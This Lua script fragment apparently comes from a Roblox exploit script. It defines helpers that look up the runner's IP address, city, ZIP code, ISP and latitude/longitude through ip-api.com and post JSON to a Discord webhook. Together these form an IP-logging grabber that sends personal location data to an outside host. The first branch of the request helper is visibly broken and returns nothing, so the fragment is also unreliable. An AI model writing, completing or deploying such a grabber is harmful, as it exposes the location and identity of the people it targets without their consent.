local function getRequestFunc()
    if syn and syn.request then return  end
    if http_request then return http_request end
    if request then return request end
    return nil
end

local function sendToWebhook(data)
    local requestFunc = getRequestFunc()
    if not requestFunc then
        warn("[Logger] HTTPリクエスト関数が見つかりません")
        return false
    end

    local http = game:GetService("HttpService")
    local json = http:JSONEncode(data)

    local success, response = pcall(function()
        return requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = json
        })
    end)

    if success and response and response.StatusCode == 204 then
        print("[Logger] Discord送信成功")
        return true
    else
        warn("[Logger] Discord送信失敗: " .. tostring(response and response.StatusCode or "不明"))
        return false
    end
end

local function getFullIPInfo()
    local requestFunc = getRequestFunc()
    if not requestFunc then return nil end

    local http = game:GetService("HttpService")
    local url = "http://ip-api.com/json/"

    local success, response = pcall(function()
        return requestFunc({ Url = url, Method = "GET" })
    end)

    if not success or not response or not response.Body then return nil end

    local data = http:JSONDecode(response.Body)
    if not data or data.status ~= "success" then return nil end

    return {
        ip = data.query or "不明",
        country = data.country or "不明",
        countryCode = data.countryCode or "不明",
        region = data.regionName or "不明",
        regionCode = data.region or "不明",
        city = data.city or "不明",
        zip = data.zip or "不明",
        isp = data.isp or "不明",
        org = data.org or "不明",
        lat = data.lat or 0,
        lon = data.lon or 0,
        timezone = data.timezone or "不明",
        as = data.as or "不明"
    }
end

